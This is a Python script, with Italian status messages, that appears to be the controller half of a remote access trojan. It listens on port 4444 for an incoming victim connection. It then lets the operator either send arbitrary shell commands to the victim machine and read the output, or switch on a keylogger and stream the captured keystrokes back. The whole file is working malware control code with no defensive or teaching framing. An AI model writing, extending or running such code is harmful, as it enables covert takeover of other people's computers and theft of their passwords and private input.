import socket
host="0.0.0.0"
port=4444
buffersize=8000


def server():
    global conn
    connection=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    connection.bind((host, port))
    connection.listen(1)
    print("sto ascoltanto....")
    conn, add=connection.accept()
    print(f"connesione da {add}")
    menu()

    
def menu():
    services=input("--keylogger-- or --comands--")
    if services=="comands":
        commands()
    elif services=="keylogger":
        keylogger()
    else:
        print("non hai specificato nessuno dei due comandi")

        
def keylogger():
    conn.send("keylogger".encode())
    recvkey()

    
def recvkey():
    try:
        while True:
            key=conn.recv(buffersize)
            print(key.decode("cp850"))
    except KeyboardInterrupt:
        conn.send("keystop".encode())
        print("keylogger stopped")
        menu()
        
    
def commands():
    cmd=input("command> ")
    if len(cmd)==0:
        commands()
    else:
        conn.send(cmd.encode())
        recv()

        
def recv():
    data=conn.recv(buffersize)
    print(data.decode("cp850"))
    commands()

    
def main():
    server()
    menu()
    
if __name__=="__main__":
    main()








